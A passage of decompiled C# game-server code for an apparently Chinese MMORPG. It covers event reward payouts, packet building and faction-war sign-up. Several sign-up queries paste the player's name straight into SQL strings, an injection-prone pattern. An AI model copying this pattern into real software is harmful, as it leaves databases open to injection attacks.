			if (World.仙魔大战进程 < 4 && World.仙魔大战进程 > 0)
			{
				if (base.仙魔大战派别 == "仙族")
				{
					移动(-100f, 150f, 15f, 41001);
				}
				else
				{
					移动(-100f, -250f, 15f, 41001);
				}
			}
			byte[] array2 = Converter.hexStringToByte("AA551E0071009100100002000000020000000900000000000000000000000000569A55AA");
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array2, array2.Length);
			}
		}

		public void 活动奖励系统(int 赠送大类)
		{
			try
			{
				switch (赠送大类)
				{
				case 1:
				{
					CheckTreasureGems();
					string[] array8 = World.仙魔大战胜利奖励物品.Split(';');
					if ((long)int.Parse(array8[0]) != 0)
					{
						base.Player_WuXun += int.Parse(array8[0]);
						更新武功和状态();
						系统提示("仙魔大战[胜利], 系统赠送您" + int.Parse(array8[0]) + "点武勋！", 3, "系统提示");
					}
					if (int.Parse(array8[1]) != 0 && base.FLD_RXPIONT != World.帐号总元宝上限)
					{
						检察元宝数据(int.Parse(array8[1]), 1, "仙魔");
						系统提示("仙魔大战[胜利], 系统赠送您" + int.Parse(array8[1]) + "个元宝！", 3, "系统提示");
					}
					if ((long)int.Parse(array8[2]) != 0)
					{
						CheckGemPointsData(int.Parse(array8[2]), 1, "仙魔");
						系统提示("仙魔大战[胜利], 系统赠送您" + int.Parse(array8[2]) + "个钻石！", 3, "系统提示");
					}
					if (long.Parse(array8[3]) != 0)
					{
						base.转生_追加_攻击 += int.Parse(array8[3]);
						系统提示("仙魔大战[胜利], 攻击" + int.Parse(array8[3]), 3, "系统提示");
					}
					if (long.Parse(array8[4]) != 0)
					{
						base.转生_追加_防御 += int.Parse(array8[4]);
						系统提示("仙魔大战[胜利], 防御" + int.Parse(array8[4]), 3, "系统提示");
					}
					if ((long)int.Parse(array8[5]) != 0)
					{
						base.转生_追加_生命 += int.Parse(array8[5]);
						系统提示("仙魔大战[胜利], 生命" + int.Parse(array8[5]), 3, "系统提示");
					}
					if ((long)int.Parse(array8[6]) != 0)
					{
						int num8 = 得到包裹空位(this);
						if (num8 == -1)
						{
							系统提示("请把背包留一个空位！", 10, "系统提示");
						}
						else
						{
							增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(int.Parse(array8[6])), 得到包裹空位(this), BitConverter.GetBytes(int.Parse(array8[7])), new byte[56]);
						}
					}
					更新HP_MP_SP();
					更新经验和历练();
					更新武功和状态();
					更新人物数据(this);
					SavePlayerData();
					SaveGemData();
					break;
				}
				case 2:
				{
					CheckTreasureGems();
					string[] array3 = World.仙魔大战失败奖励物品.Split(';');
					if ((long)int.Parse(array3[0]) != 0)
					{
						base.Player_WuXun += int.Parse(array3[0]);
						更新武功和状态();
						系统提示("仙魔大战[失败], 系统赠送您" + int.Parse(array3[0]) + "点武勋！", 10, "系统提示");
					}
					if (int.Parse(array3[1]) != 0 && base.FLD_RXPIONT != World.帐号总元宝上限)
					{
						检察元宝数据(int.Parse(array3[1]), 1, "仙魔");
						系统提示("仙魔大战[失败], 系统赠送您" + int.Parse(array3[1]) + "个元宝！", 10, "系统提示");
					}
					if ((long)int.Parse(array3[2]) != 0)
					{
						CheckGemPointsData(int.Parse(array3[2]), 1, "仙魔");
						系统提示("仙魔大战[失败], 系统赠送您" + int.Parse(array3[2]) + "个钻石！", 10, "系统提示");
					}
					if (long.Parse(array3[3]) != 0)
					{
						base.转生_追加_攻击 += int.Parse(array3[3]);
						系统提示("仙魔大战[失败], 攻击" + int.Parse(array3[3]), 10, "系统提示");
					}
					if (long.Parse(array3[4]) != 0)
					{
						base.转生_追加_防御 += int.Parse(array3[4]);
						系统提示("仙魔大战[失败], 防御" + int.Parse(array3[4]), 10, "系统提示");
					}
					if ((long)int.Parse(array3[5]) != 0)
					{
						base.转生_追加_生命 += int.Parse(array3[5]);
						系统提示("仙魔大战[失败], 生命" + int.Parse(array3[5]), 10, "系统提示");
					}
					if ((long)int.Parse(array3[6]) != 0)
					{
						int num3 = 得到包裹空位(this);
						if (num3 == -1)
						{
							系统提示("请把背包留一个空位！", 10, "系统提示");
						}
						else
						{
							增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(int.Parse(array3[6])), 得到包裹空位(this), BitConverter.GetBytes(int.Parse(array3[7])), new byte[56]);
						}
					}
					更新HP_MP_SP();
					更新经验和历练();
					更新武功和状态();
					更新人物数据(this);
					SavePlayerData();
					SaveGemData();
					break;
				}
				case 3:
				{
					CheckTreasureGems();
					string[] array7 = World.天魔胜利奖励物品.Split(';');
					if ((long)int.Parse(array7[0]) != 0)
					{
						base.Player_WuXun += int.Parse(array7[0]);
						更新武功和状态();
						系统提示("攻城战[占领门派], 系统赠送您" + int.Parse(array7[0]) + "点武勋！", 3, "系统提示");
					}
					if (int.Parse(array7[1]) != 0 && base.FLD_RXPIONT != World.帐号总元宝上限)
					{
						检察元宝数据(int.Parse(array7[1]), 1, "攻城");
						系统提示("攻城战[占领门派], 系统赠送您" + int.Parse(array7[1]) + "个元宝！", 3, "系统提示");
					}
					if ((long)int.Parse(array7[2]) != 0)
					{
						CheckGemPointsData(int.Parse(array7[2]), 1, "攻城");
						系统提示("攻城战[占领门派], 系统赠送您" + int.Parse(array7[2]) + "个钻石！", 3, "系统提示");
					}
					if (long.Parse(array7[3]) != 0)
					{
						base.转生_追加_攻击 += int.Parse(array7[3]);
						系统提示("攻城战[占领门派], 攻击" + int.Parse(array7[3]), 3, "系统提示");
					}
					if (long.Parse(array7[4]) != 0)
					{
						base.转生_追加_防御 += int.Parse(array7[4]);
						系统提示("攻城战[占领门派], 防御" + int.Parse(array7[4]), 3, "系统提示");
					}
					if ((long)int.Parse(array7[5]) != 0)
					{
						base.转生_追加_生命 += int.Parse(array7[5]);
						系统提示("攻城战[占领门派], 生命" + int.Parse(array7[5]), 3, "系统提示");
					}
					if ((long)int.Parse(array7[6]) != 0)
					{
						int num7 = 得到包裹空位(this);
						if (num7 == -1)
						{
							系统提示("请把背包留一个空位！", 10, "系统提示");
						}
						else
						{
							增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(int.Parse(array7[6])), 得到包裹空位(this), BitConverter.GetBytes(int.Parse(array7[7])), new byte[56]);
						}
					}
					更新HP_MP_SP();
					更新经验和历练();
					更新武功和状态();
					更新人物数据(this);
					SavePlayerData();
					SaveGemData();
					break;
				}
				case 4:
				{
					CheckTreasureGems();
					string[] array4 = World.天魔失败奖励物品.Split(';');
					if ((long)int.Parse(array4[0]) != 0)
					{
						base.Player_WuXun += int.Parse(array4[0]);
						更新武功和状态();
						系统提示("攻城战[参与门派], 系统赠送您" + int.Parse(array4[0]) + "点武勋！", 10, "系统提示");
					}
					if (int.Parse(array4[1]) != 0 && base.FLD_RXPIONT != World.帐号总元宝上限)
					{
						检察元宝数据(int.Parse(array4[1]), 1, "攻城");
						系统提示("攻城战[参与门派], 系统赠送您" + int.Parse(array4[1]) + "个元宝！", 10, "系统提示");
					}
					if ((long)int.Parse(array4[2]) != 0)
					{
						CheckGemPointsData(int.Parse(array4[2]), 1, "攻城");
						系统提示("攻城战[参与门派], 系统赠送您" + int.Parse(array4[2]) + "个钻石！", 10, "系统提示");
					}
					if (long.Parse(array4[3]) != 0)
					{
						base.转生_追加_攻击 += int.Parse(array4[3]);
						系统提示("攻城战[参与门派], 攻击" + int.Parse(array4[3]), 10, "系统提示");
					}
					if (long.Parse(array4[4]) != 0)
					{
						base.转生_追加_防御 += int.Parse(array4[4]);
						系统提示("攻城战[参与门派], 防御" + int.Parse(array4[4]), 10, "系统提示");
					}
					if ((long)int.Parse(array4[5]) != 0)
					{
						base.转生_追加_生命 += int.Parse(array4[5]);
						系统提示("攻城战[参与门派], 生命" + int.Parse(array4[5]), 10, "系统提示");
					}
					if ((long)int.Parse(array4[6]) != 0)
					{
						int num4 = 得到包裹空位(this);
						if (num4 == -1)
						{
							系统提示("请把背包留一个空位！", 10, "系统提示");
						}
						else
						{
							增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(int.Parse(array4[6])), 得到包裹空位(this), BitConverter.GetBytes(int.Parse(array4[7])), new byte[56]);
						}
					}
					更新HP_MP_SP();
					更新经验和历练();
					更新武功和状态();
					更新人物数据(this);
					SavePlayerData();
					SaveGemData();
					break;
				}
				case 5:
				{
					CheckTreasureGems();
					string[] array6 = World.仙魔大战平局奖励物品.Split(';');
					if ((long)int.Parse(array6[0]) != 0)
					{
						base.Player_WuXun += int.Parse(array6[0]);
						更新武功和状态();
						系统提示("仙魔大战[平局], 系统赠送您" + int.Parse(array6[0]) + "点武勋！", 10, "系统提示");
					}
					if (int.Parse(array6[1]) != 0 && base.FLD_RXPIONT != World.帐号总元宝上限)
					{
						检察元宝数据(int.Parse(array6[1]), 1, "仙魔");
						系统提示("仙魔大战[平局], 系统赠送您" + int.Parse(array6[1]) + "个元宝！", 10, "系统提示");
					}
					if ((long)int.Parse(array6[2]) != 0)
					{
						CheckGemPointsData(int.Parse(array6[2]), 1, "仙魔");
						系统提示("仙魔大战[平局], 系统赠送您" + int.Parse(array6[2]) + "个钻石！", 10, "系统提示");
					}
					if (long.Parse(array6[3]) != 0)
					{
						base.转生_追加_攻击 += int.Parse(array6[3]);
						系统提示("仙魔大战[平局], 攻击" + int.Parse(array6[3]), 10, "系统提示");
					}
					if (long.Parse(array6[4]) != 0)
					{
						base.转生_追加_防御 += int.Parse(array6[4]);
						系统提示("仙魔大战[平局], 防御" + int.Parse(array6[4]), 10, "系统提示");
					}
					if ((long)int.Parse(array6[5]) != 0)
					{
						base.转生_追加_生命 += int.Parse(array6[5]);
						系统提示("仙魔大战[平局], 生命" + int.Parse(array6[5]), 10, "系统提示");
					}
					if ((long)int.Parse(array6[6]) != 0)
					{
						int num6 = 得到包裹空位(this);
						if (num6 == -1)
						{
							系统提示("请把背包留一个空位！", 10, "系统提示");
						}
						else
						{
							增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(int.Parse(array6[6])), 得到包裹空位(this), BitConverter.GetBytes(int.Parse(array6[7])), new byte[56]);
						}
					}
					更新HP_MP_SP();
					更新经验和历练();
					更新武功和状态();
					更新人物数据(this);
					SavePlayerData();
					SaveGemData();
					break;
				}
				case 6:
				{
					CheckTreasureGems();
					string[] array2 = World.门战参与奖励物品.Split(';');
					if ((long)int.Parse(array2[0]) != 0)
					{
						base.Player_WuXun += int.Parse(array2[0]);
						更新武功和状态();
						系统提示("门战[参与奖], 系统赠送您" + int.Parse(array2[0]) + "点武勋！", 10, "系统提示");
					}
					if (int.Parse(array2[1]) != 0 && base.FLD_RXPIONT != World.帐号总元宝上限)
					{
						检察元宝数据(int.Parse(array2[1]), 1, "门战");
						系统提示("门战[参与奖], 系统赠送您" + int.Parse(array2[1]) + "个元宝！", 10, "系统提示");
					}
					if ((long)int.Parse(array2[2]) != 0)
					{
						CheckGemPointsData(int.Parse(array2[2]), 1, "门战");
						系统提示("门战[参与奖], 系统赠送您" + int.Parse(array2[2]) + "个钻石！", 10, "系统提示");
					}
					if (long.Parse(array2[3]) != 0)
					{
						base.转生_追加_攻击 += int.Parse(array2[3]);
						系统提示("门战[参与奖], 攻击" + int.Parse(array2[3]), 10, "系统提示");
					}
					if (long.Parse(array2[4]) != 0)
					{
						base.转生_追加_防御 += int.Parse(array2[4]);
						系统提示("门战[参与奖], 防御" + int.Parse(array2[4]), 10, "系统提示");
					}
					if ((long)int.Parse(array2[5]) != 0)
					{
						base.转生_追加_生命 += int.Parse(array2[5]);
						系统提示("门战[参与奖], 生命" + int.Parse(array2[5]), 10, "系统提示");
					}
					if ((long)int.Parse(array2[6]) != 0)
					{
						int num2 = 得到包裹空位(this);
						if (num2 == -1)
						{
							系统提示("请把背包留一个空位！", 10, "系统提示");
						}
						else
						{
							增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(int.Parse(array2[6])), 得到包裹空位(this), BitConverter.GetBytes(int.Parse(array2[7])), new byte[56]);
						}
					}
					更新HP_MP_SP();
					更新经验和历练();
					更新武功和状态();
					更新人物数据(this);
					SavePlayerData();
					SaveGemData();
					break;
				}
				case 7:
				{
					CheckTreasureGems();
					string[] array5 = World.势力战胜利奖励物品.Split(';');
					if ((long)int.Parse(array5[0]) != 0)
					{
						base.Player_WuXun += int.Parse(array5[0]);
						更新武功和状态();
						系统提示("势力战[胜利方], 系统赠送您" + int.Parse(array5[0]) + "点武勋！", 10, "系统提示");
					}
					if (int.Parse(array5[1]) != 0 && base.FLD_RXPIONT != World.帐号总元宝上限)
					{
						检察元宝数据(int.Parse(array5[1]), 1, "势力战");
						系统提示("势力战[胜利方], 系统赠送您" + int.Parse(array5[1]) + "个元宝！", 10, "系统提示");
					}
					if ((long)int.Parse(array5[2]) != 0)
					{
						CheckGemPointsData(int.Parse(array5[2]), 1, "势力战");
						系统提示("势力战[胜利方], 系统赠送您" + int.Parse(array5[2]) + "个钻石！", 10, "系统提示");
					}
					if (long.Parse(array5[3]) != 0)
					{
						base.转生_追加_攻击 += int.Parse(array5[3]);
						系统提示("势力战[胜利方], 攻击" + int.Parse(array5[3]), 10, "系统提示");
					}
					if (long.Parse(array5[4]) != 0)
					{
						base.转生_追加_防御 += int.Parse(array5[4]);
						系统提示("势力战[胜利方], 防御" + int.Parse(array5[4]), 10, "系统提示");
					}
					if ((long)int.Parse(array5[5]) != 0)
					{
						base.转生_追加_生命 += int.Parse(array5[5]);
						系统提示("势力战[胜利方], 生命" + int.Parse(array5[5]), 10, "系统提示");
					}
					if ((long)int.Parse(array5[6]) != 0)
					{
						int num5 = 得到包裹空位(this);
						if (num5 == -1)
						{
							系统提示("请把背包留一个空位！", 10, "系统提示");
						}
						else
						{
							增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(int.Parse(array5[6])), 得到包裹空位(this), BitConverter.GetBytes(int.Parse(array5[7])), new byte[56]);
						}
					}
					更新HP_MP_SP();
					更新经验和历练();
					更新武功和状态();
					更新人物数据(this);
					SavePlayerData();
					SaveGemData();
					break;
				}
				case 8:
				{
					CheckTreasureGems();
					string[] array = World.势力战参与奖励物品.Split(';');
					if ((long)int.Parse(array[0]) != 0)
					{
						base.Player_WuXun += int.Parse(array[0]);
						更新武功和状态();
						系统提示("势力战[参与奖], 系统赠送您" + int.Parse(array[0]) + "点武勋！", 10, "系统提示");
					}
					if (int.Parse(array[1]) != 0 && base.FLD_RXPIONT != World.帐号总元宝上限)
					{
						检察元宝数据(int.Parse(array[1]), 1, "势力战");
						系统提示("势力战[参与奖], 系统赠送您" + int.Parse(array[1]) + "个元宝！", 10, "系统提示");
					}
					if ((long)int.Parse(array[2]) != 0)
					{
						CheckGemPointsData(int.Parse(array[2]), 1, "势力战");
						系统提示("势力战[参与奖], 系统赠送您" + int.Parse(array[2]) + "个钻石！", 10, "系统提示");
					}
					if (long.Parse(array[3]) != 0)
					{
						base.转生_追加_攻击 += int.Parse(array[3]);
						系统提示("势力战[参与奖], 攻击" + int.Parse(array[3]), 10, "系统提示");
					}
					if (long.Parse(array[4]) != 0)
					{
						base.转生_追加_防御 += int.Parse(array[4]);
						系统提示("势力战[参与奖], 防御" + int.Parse(array[4]), 10, "系统提示");
					}
					if ((long)int.Parse(array[5]) != 0)
					{
						base.转生_追加_生命 += int.Parse(array[5]);
						系统提示("势力战[参与奖], 生命" + int.Parse(array[5]), 10, "系统提示");
					}
					if ((long)int.Parse(array[6]) != 0)
					{
						int num = 得到包裹空位(this);
						if (num == -1)
						{
							系统提示("请把背包留一个空位！", 10, "系统提示");
						}
						else
						{
							增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(int.Parse(array[6])), 得到包裹空位(this), BitConverter.GetBytes(int.Parse(array[7])), new byte[56]);
						}
					}
					更新HP_MP_SP();
					更新经验和历练();
					更新武功和状态();
					更新人物数据(this);
					SavePlayerData();
					SaveGemData();
					break;
				}
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "仙魔大战赠送出错 [" + base.Userid + "]-[" + base.UserName + "]" + ex.Message);
			}
		}

		public void 结婚功能包(int 阶段, string 新郎名字, string 新娘名字, int 标识)
		{
			byte[] array = Converter.hexStringToByte("AA55460043057A17380026000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003B0955AA");
			Buffer.BlockCopy(BitConverter.GetBytes(阶段), 0, array, 10, 4);
			Buffer.BlockCopy(Encoding.Default.GetBytes(新郎名字), 0, array, 18, Encoding.Default.GetBytes(新郎名字).Length);
			Buffer.BlockCopy(Encoding.Default.GetBytes(新娘名字), 0, array, 33, Encoding.Default.GetBytes(新娘名字).Length);
			Buffer.BlockCopy(BitConverter.GetBytes(标识), 0, array, 50, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void PVP黄龙对战(int a, int b, int c)
		{
			using 发包类 发包类 = new 发包类();
			发包类.Write4(a);
			发包类.Write4(b);
			发包类.Write4(c);
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 8705, base.人物全服ID);
			}
		}

		public void 查看气功(byte[] 封包数据, int 封包大小)
		{
			int num = BitConverter.ToInt32(封包数据, 14);
			Players players = 得到人物数据(num);
			if (players == null)
			{
				return;
			}
			using 发包类 发包类 = new 发包类();
			发包类.Write4(1);
			发包类.Write2(num);
			发包类.Write2(0);
			发包类.Write2(players.Player_Qigong_point);
			for (int i = 0; i < 15; i++)
			{
				if (i < 12)
				{
					发包类.Write2(players.气功[i].气功ID);
					if (players.气功[i].气功ID != 0)
					{
						if (players.气功[i].气功量 != 0)
						{
							发包类.Write2(players.气功[i].气功量 + players.FLD_装备_追加_气功 + players.FLD_人物_追加_气功 + players.人物_WX_BUFF_气功 + (int)players.得到单项气功增加值(i) + players.FLD_药品_追加_气功);
						}
						else
						{
							发包类.Write2(0);
						}
					}
					else
					{
						发包类.Write2(0);
					}
				}
				else
				{
					发包类.Write4(0);
				}
			}
			if (players.Player_Job_leve >= 6)
			{
				foreach (升天气功类 value in players.升天气功.Values)
				{
					发包类.Write2(value.气功ID);
					if (value.气功量 != 0)
					{
						发包类.Write2(value.气功量 + players.FLD_装备_追加_气功 + players.FLD_人物_追加_气功 + players.人物_WX_BUFF_气功 + (int)players.得到单项气功增加值(value.气功ID) + players.FLD_药品_追加_气功);
					}
					else
					{
						发包类.Write2(0);
					}
				}
				for (int j = 0; j < 15 - players.升天气功.Count; j++)
				{
					发包类.Write2(0);
					发包类.Write2(0);
				}
			}
			if (base.Client != null)
			{
				base.Client.SendPak(发包类, 9241, base.人物全服ID);
			}
		}

		public void 仙魔大战系统(byte[] 封包数据, int length)
		{
			封包修改(封包数据, length);
			Buffer.BlockCopy(BitConverter.GetBytes(0), 0, 封包数据, 3, 1);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, 封包数据, 4, 2);
			byte[] array = new byte[2];
			byte[] array2 = new byte[2];
			Buffer.BlockCopy(封包数据, 10, array, 0, 2);
			Buffer.BlockCopy(封包数据, 18, array2, 0, 2);
			switch (BitConverter.ToInt16(array, 0))
			{
			case 2:
				if (BitConverter.ToInt16(array2, 0) == 1)
				{
					if (base.人物坐标_地图 == 41001)
					{
						return;
					}
					if (base.Player_Job_leve >= 2)
					{
						if (base.Player_Zx == 1)
						{
							DBA.ExeSqlCommand("DELETE FROM TBL_仙魔大战 where FLD_名字='" + base.UserName + "'");
							DBA.ExeSqlCommand("INSERT INTO TBL_仙魔大战 VALUES('" + base.UserName + "','仙族','1')");
						}
						else
						{
							DBA.ExeSqlCommand("DELETE FROM TBL_仙魔大战 where FLD_名字='" + base.UserName + "'");
							DBA.ExeSqlCommand("INSERT INTO TBL_仙魔大战 VALUES('" + base.UserName + "','魔族','1')");
						}
						DataTable dBToDataTable = DBA.GetDBToDataTable("SELECT * FROM TBL_仙魔大战 WHERE FLD_种族 = '仙族' AND FLD_在线=1");
						DataTable dBToDataTable2 = DBA.GetDBToDataTable("SELECT * FROM TBL_仙魔大战 WHERE FLD_种族 = '魔族' AND FLD_在线=1");
						World.仙魔大战正人数 = dBToDataTable.Rows.Count;
						World.仙魔大战邪人数 = dBToDataTable2.Rows.Count;
						MainForm.WriteLine(1, "仙族人数:[" + World.仙魔大战正人数 + "] 魔族人数:[" + World.仙魔大战邪人数 + "] 总人数:[" + (World.仙魔大战正人数 + World.仙魔大战邪人数) + "]");
					}
					if (base.Player_Job_leve >= 2 && ((base.人物坐标_地图 != 41001) ? true : false) && !World.申请仙魔大战人物列表.ContainsKey(base.UserName))
					{
						World.申请仙魔大战人物列表.TryAdd(base.UserName, this);
						Buffer.BlockCopy(BitConverter.GetBytes(2), 0, 封包数据, 10, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(2), 0, 封包数据, 14, 2);
						if (World.仙魔大战正人数 == World.仙魔大战邪人数)
						{
							DBA.ExeSqlCommand("UPDATE TBL_仙魔大战 SET FLD_种族='仙族' WHERE FLD_名字='" + base.UserName + "'");
							base.仙魔大战派别 = "仙族";
							if (World.是否开启共用银币市场 == 1)
							{
								World.conn.发送("仙魔大战人数|" + World.仙魔大战正人数 + "|" + World.仙魔大战邪人数);
								换线移动(-100f, 150f, 15f, 41001);
							}
							else
							{
								移动(-100f, 150f, 15f, 41001);
							}
							系统提示("您属于≮仙族≯, 敌对势力为≮白披风≯, 如自身披风外观异常, 请打开披风效果。", 3, "仙族");
						}
						else if (World.仙魔大战正人数 > World.仙魔大战邪人数)
						{
							DBA.ExeSqlCommand("UPDATE TBL_仙魔大战 SET FLD_种族='魔族' WHERE FLD_名字='" + base.UserName + "'");
							base.仙魔大战派别 = "魔族";
							if (World.是否开启共用银币市场 == 1)
							{
								World.conn.发送("仙魔大战人数|" + World.仙魔大战正人数 + "|" + World.仙魔大战邪人数);
								换线移动(-100f, -250f, 15f, 41001);
							}
							else
							{
								移动(-100f, -250f, 15f, 41001);
							}
							系统提示("您属于≮魔族≯, 敌对势力为≮白披风≯, 如自身披风外观异常, 请打开披风效果。", 10, "魔族");
						}
						else if (World.仙魔大战正人数 < World.仙魔大战邪人数)
						{
							DBA.ExeSqlCommand("UPDATE TBL_仙魔大战 SET FLD_种族='仙族' WHERE FLD_名字='" + base.UserName + "'");
							base.仙魔大战派别 = "仙族";
							if (World.是否开启共用银币市场 == 1)
							{
								World.conn.发送("仙魔大战人数|" + World.仙魔大战正人数 + "|" + World.仙魔大战邪人数);
								换线移动(-100f, 150f, 15f, 41001);
							}
							else
							{
								移动(-100f, 150f, 15f, 41001);
							}
							系统提示("您属于≮仙族≯, 敌对势力为≮黑披风≯, 如自身披风外观异常, 请打开披风效果。", 3, "仙族");
						}
					}
					else
					{
						Buffer.BlockCopy(array, 0, 封包数据, 10, 2);
						Buffer.BlockCopy(array, 0, 封包数据, 14, 2);
					}
				}
				else
				{
					是否拒绝仙魔大战 = 1;
					发送仙魔大战关闭消息();
					系统提示("你已经拒绝参加仙魔大战，将无法参加。");
				}
				break;
			case 3:
				if (BitConverter.ToInt16(array2, 0) == 1)
				{
					if (base.人物坐标_地图 == 41001)
					{
						return;
					}
					if (base.Player_Job_leve >= 2)
					{
						if (base.Player_Zx == 1)
						{
							DBA.ExeSqlCommand("DELETE FROM TBL_仙魔大战 where FLD_名字='" + base.UserName + "'");
							DBA.ExeSqlCommand("INSERT INTO TBL_仙魔大战 VALUES('" + base.UserName + "','仙族','1')");
						}
						else
						{
							DBA.ExeSqlCommand("DELETE FROM TBL_仙魔大战 where FLD_名字='" + base.UserName + "'");
							DBA.ExeSqlCommand("INSERT INTO TBL_仙魔大战 VALUES('" + base.UserName + "','魔族','1')");
						}
						DataTable dBToDataTable3 = DBA.GetDBToDataTable("SELECT * FROM TBL_仙魔大战 WHERE FLD_种族 = '仙族' AND FLD_在线=1");
						DataTable dBToDataTable4 = DBA.GetDBToDataTable("SELECT * FROM TBL_仙魔大战 WHERE FLD_种族 = '魔族' AND FLD_在线=1");
						World.仙魔大战正人数 = dBToDataTable3.Rows.Count;
						World.仙魔大战邪人数 = dBToDataTable4.Rows.Count;
						MainForm.WriteLine(2, "仙族人数:[" + World.仙魔大战正人数 + "] 魔族人数:[" + World.仙魔大战邪人数 + "] 总人数:[" + (World.仙魔大战正人数 + World.仙魔大战邪人数) + "]");
					}
					if (base.Player_Job_leve >= 2 && ((base.人物坐标_地图 != 41001) ? true : false) && !World.申请仙魔大战人物列表.ContainsKey(base.UserName))
					{
						World.申请仙魔大战人物列表.TryAdd(base.UserName, this);
						Buffer.BlockCopy(BitConverter.GetBytes(2), 0, 封包数据, 10, 2);
						Buffer.BlockCopy(BitConverter.GetBytes(2), 0, 封包数据, 14, 2);
						if (World.仙魔大战正人数 == World.仙魔大战邪人数)
						{
							DBA.ExeSqlCommand("UPDATE TBL_仙魔大战 SET FLD_种族='仙族' WHERE FLD_名字='" + base.UserName + "'");
							base.仙魔大战派别 = "仙族";
							if (World.是否开启共用银币市场 == 1)
							{
								World.conn.发送("仙魔大战人数|" + World.仙魔大战正人数 + "|" + World.仙魔大战邪人数);
								换线移动(-100f, 150f, 15f, 41001);
							}
							else
							{
								移动(-100f, 150f, 15f, 41001);
							}
							系统提示("您属于[仙族], 敌对势力为[白披风], 如自身披风外观异常, 请打开披风效果。", 3, "仙族");
						}
						else if (World.仙魔大战正人数 > World.仙魔大战邪人数)
						{
							DBA.ExeSqlCommand("UPDATE TBL_仙魔大战 SET FLD_种族='魔族' WHERE FLD_名字='" + base.UserName + "'");
							base.仙魔大战派别 = "魔族";
							if (World.是否开启共用银币市场 == 1)
							{
								World.conn.发送("仙魔大战人数|" + World.仙魔大战正人数 + "|" + World.仙魔大战邪人数);
								换线移动(-100f, -250f, 15f, 41001);
							}
							else
							{
								移动(-100f, -250f, 15f, 41001);
							}
							系统提示("您属于[魔族], 敌对势力为[黑披风], 如自身披风外观异常, 请打开披风效果。", 10, "魔族");
						}
						else if (World.仙魔大战正人数 < World.仙魔大战邪人数)
						{
							DBA.ExeSqlCommand("UPDATE TBL_仙魔大战 SET FLD_种族='仙族' WHERE FLD_名字='" + base.UserName + "'");
							base.仙魔大战派别 = "仙族";
							if (World.是否开启共用银币市场 == 1)
							{
								World.conn.发送("仙魔大战人数|" + World.仙魔大战正人数 + "|" + World.仙魔大战邪人数);
								换线移动(-100f, 150f, 15f, 41001);
							}
							else
							{
								移动(-100f, 150f, 15f, 41001);
							}
							系统提示("您属于[仙族], 敌对势力为[白披风], 如自身披风外观异常, 请打开披风效果。", 3, "仙族");
						}
					}
					else
					{
						Buffer.BlockCopy(array, 0, 封包数据, 10, 2);
						Buffer.BlockCopy(array, 0, 封包数据, 14, 2);
					}
				}
				else
				{
					是否拒绝仙魔大战 = 1;
					发送仙魔大战关闭消息();
					系统提示("你已经拒绝参加仙魔大战，将无法参加。");
				}
				break;
			case 4:
				switch (BitConverter.ToInt16(array2, 0))
				{
				case 1:
					if (base.仙魔大战派别 == "仙族")
					{
						死亡移动(-100f, 150f, 15f, 41001);
					}
					else
					{
						死亡移动(-100f, -250f, 15f, 41001);
					}
					break;
				case 2:
					死亡移动(-100f, -50f, 15f, 41001);
					break;
				}
				base.人物_HP = base.人物最大_HP;
				更新HP_MP_SP();
				base.Player死亡 = false;
				break;
			case 11:
				if (World.老泫勃派开关 == 1)
				{
					移动(495f, 1727f, 15f, 29000);
				}
				else
				{
					移动(499f, 2215f, 15f, 101);
				}
				获取复查范围玩家();
				获取复查范围Npc();
				获取复查范围地面物品();
				break;
			default:
				Buffer.BlockCopy(array, 0, 封包数据, 10, 2);
				Buffer.BlockCopy(array, 0, 封包数据, 14, 2);
				break;
			}
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, 封包数据, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(封包数据, 封包数据.Length);
			}
		}

		public void 查看装备(byte[] 封包数据, int 封包大小)
		{
			try
			{
				int num = BitConverter.ToInt32(封包数据, 10);
				Players players = 得到人物数据(num);
				if (players == null || num == base.人物全服ID)
				{
					return;
				}
				using 发包类 发包类 = new 发包类();
				发包类.Write4(1);
				发包类.Write2(num);
				发包类.Write2(0);
				for (int i = 0; i < 15; i++)
				{
					发包类.Write(players.装备栏已穿装备[i].GetByte(), 0, 96);
				}
				发包类.Write(new byte[96]);
				发包类.Write(new byte[96]);
				发包类.Write(new byte[96]);
				发包类.Write(new byte[96]);
				发包类.Write(new byte[96]);
				发包类.Write(new byte[96]);
				发包类.Write(new byte[96]);
				发包类.Write(new byte[96]);
				发包类.Write(new byte[96]);
				发包类.Write(new byte[96]);
				发包类.Write(new byte[96]);
				发包类.Write(new byte[96]);
				发包类.Write(new byte[96]);
				发包类.Write(new byte[96]);
				发包类.Write(new byte[96]);
				发包类.Write(players.装备栏已穿装备[15].GetByte(), 0, 96);
				if (base.Client != null)
				{
					base.Client.SendPak(发包类, 4889, base.人物全服ID);
				}
			}
			catch
			{
			}
		}

		public void 组队道具分配规则(byte[] data, int length)
		{
			int 人物ID = BitConverter.ToInt16(data, 4);
			int num = BitConverter.ToInt16(data, 10);
			if (得到人物数据(人物ID) == null)
			{
				return;
			}
			using 发包类 发包类 = new 发包类();
			发包类.Write2(1);
			发包类.Write2(num);
			if (!World.Teams.TryGetValue(组队id, out var value))
			{
				return;
			}
			value.道具分配规则 = num;
			foreach (Players value2 in value.组队列表.Values)
			{
				if (value2.Client != null)
				{
					value2.Client.SendPak(发包类, 11008, value2.人物全服ID);
				}
			}
		}

